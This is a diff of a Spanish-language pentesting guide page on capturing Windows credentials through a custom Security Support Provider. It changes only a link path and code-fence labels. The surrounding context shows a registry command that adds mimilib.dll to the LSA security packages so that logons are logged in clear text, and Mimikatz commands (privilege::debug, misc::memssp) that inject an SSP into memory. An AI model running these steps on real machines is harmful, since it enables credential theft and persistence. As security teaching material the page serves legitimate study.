@@ -4,7 +4,7 @@
 
 ### Custom SSP
 
-[Aprende qué es un SSP (Proveedor de Soporte de Seguridad) aquí.](../authentication-credentials-uac-and-efs/#security-support-provider-interface-sspi)\
+[Aprende qué es un SSP (Proveedor de Soporte de Seguridad) aquí.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
 Puedes crear tu **propio SSP** para **capturar** en **texto claro** las **credenciales** utilizadas para acceder a la máquina.
 
 #### Mimilib
@@ -19,7 +19,7 @@ HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
 Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
 ```
 Agrega `mimilib.dll` a la lista de Proveedores de Soporte de Seguridad (Paquetes de Seguridad):
-```powershell
+```bash
 reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
 ```
 Y después de un reinicio, todas las credenciales se pueden encontrar en texto claro en `C:\Windows\System32\kiwissp.log`
@@ -27,7 +27,7 @@ Y después de un reinicio, todas las credenciales se pueden encontrar en texto c
 #### En memoria
 
 También puedes inyectar esto en memoria directamente usando Mimikatz (ten en cuenta que podría ser un poco inestable/no funcionar):
-```powershell
+```bash
 privilege::debug
 misc::memssp
 ```
